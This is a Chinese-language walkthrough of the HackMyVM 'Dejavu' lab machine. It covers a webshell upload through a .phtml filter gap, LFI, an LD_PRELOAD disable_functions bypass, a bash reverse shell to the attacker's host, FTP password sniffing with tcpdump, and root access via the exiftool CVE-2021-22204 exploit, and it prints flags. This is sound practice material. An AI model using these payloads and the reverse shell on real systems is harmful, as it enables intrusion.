# Dejavu

2025.02.11 https://hackmyvm.eu/machines/machine.php?vm=Dejavu

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 web ，gobuster 发现 http://192.168.5.39/info.php 是一个 phpinfo 页面，查看其源码，发现注释：/S3cR3t，访问后是一个文件上传页面 http://192.168.5.39/S3cR3t/upload.php

可能有任意文件上传漏洞，进行尝试，上传图片，发现上传后的图片出现在同目录 files 中 http://192.168.5.39/S3cR3t/files/1.png

发现上传后缀名为 php3、php4、php5、.htaccess 等都不行，但是 phtml 的后缀可以上传。在 http://192.168.5.39/info.php 中查看到 disable_functions 把基本的命令执行参数禁用了。

尝试将上传的内容改成 `<?php include($_GET[1]);?>` 发现可以执行 LFI，并且在 info.php 中显示了 info 文件的路径: `/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/info.php`, 使用 filter 进行读取：

```
curl -O- http://192.168.5.39/S3cR3t/files/2.png.phtml?1=php://filter/read=convert.base64-encode/resource=/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/info.php

# base64 解码后为
<html>
<body>
<!-- /S3cR3t -->
</body>
</html>
<?php
phpinfo();
?>
```

```
curl -o- http://192.168.5.39/S3cR3t/files/2.png.phtml?1=php://filter/read=convert.base64-encode/resource=/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/upload.php | base64 -d

<?php
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "files/";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    $imageFileType = strtolower(pathinfo($path,PATHINFO_EXTENSION));
    $uploadOk = 1;
    // Allow certain file formats
    if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" && $imageFileType != "txt" && $imageFileType != "phtml" && $imageFileType != "aspx") {
      echo nl2br("\nThis extension is not allowed.");
    $uploadOk = 0;
    }
    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
      echo " Sorry, your file was not uploaded.";
    // if everything is ok, try to upload file
    } else {
      if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
        echo nl2br("\nThe file ".  basename( $_FILES['uploaded_file']['name']). " has been uploaded.");
      } else{
          echo "There was an error uploading the file, please try again!";
      }
    }
  }
?>
```

经过查询，发现未禁用 putenv 和 mail 函数，则可以利用 LD_PRELOAD 绕过 disable_functions，有现成的利用工具进行利用 https://github.com/kriss-u/chankro-py3 下载后执行:

```
echo '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1' > 8888.sh
python3 chankro-py3-master/chankro.py --arch 64 --input 8888.sh --output shell.phtml --path /var/www/html
```

然后将生成的 shell.phtml 上传，在 kali 上建立 8888 监听，然后访问 http://192.168.5.39/S3cR3t/files/shell.phtml 就得到了反弹的链接:

```
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

得到 shell 后，sudo -l 发现: (robert) NOPASSWD: /usr/sbin/tcpdump 尝试用它提权到 robert，但是不成功，出现报错：

```
COMMAND='/bin/bash';TF=$(mktemp);echo "$COMMAND" > $TF;chmod +x $TF
sudo -u robert /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
```

ss -tnlp 发现本地启用了 21 ftp，看看里面有什么，匿名无法登陆，同时在 robet 家目录下，发现一个 auth.sh 文件，但是无法查看其内容，看名字像是跟认证有关系，那就尝试用 tcpdump 监听下 21 端口，看看会不会有显示：

```
cd /tmp
tcpdump -i lo port ftp

1分钟后显示：
FTP: USER robert
FTP: PASS 9737bo0hFx4
```

应该是一个定时任务，在一直访问 21 端口。使用得到的 robert 凭据，尝试登陆 ssh，看是否有密码复用的情况：

```
ssh robert@192.168.5.39 输入密码: 9737bo0hFx4
```

得到了 user flag：

```
robert@dejavu:~$ cat user.txt
HMV{c8b75037150fbdc49f6c941b72db0d7c}
```

这里 auth.sh 确实是定时在执行：

```
crontab -l
* *	* * *	/home/robert/auth.sh

robert@dejavu:~$ cat auth.sh
ftp -n localhost <<FIN
quote USER robert
quote PASS 9737bo0hFx4
bye
FIN
```

sudo -l 发现: (root) NOPASSWD: /usr/local/bin/exiftool GTFOBin 中显示可以读取文件，但是不知道 root 目录中的 root.txt 的具体名字，下面的读取方法不对：

```
sudo exiftool -filename=/tmp/root.txt /root/root.txt
```

搜索 exiftool 有没有其他的漏洞可以利用，找到 https://github.com/convisolabs/CVE-2021-22204-exiftool 下载其中的 python 脚本 https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py 到目标机器上，然后修改其中的 Ip 和 port 为 kali 上的监听端口，然后执行：

```
cd /tmp
python3 exp.py
sudo exiftool -u root exiftool ./exploit.djvu
```

在反弹的链接上得到了 root 权限：

```
# cat r0ot.tXt
HMV{c62d75d636f66450980dca2c4a3457d8}
```
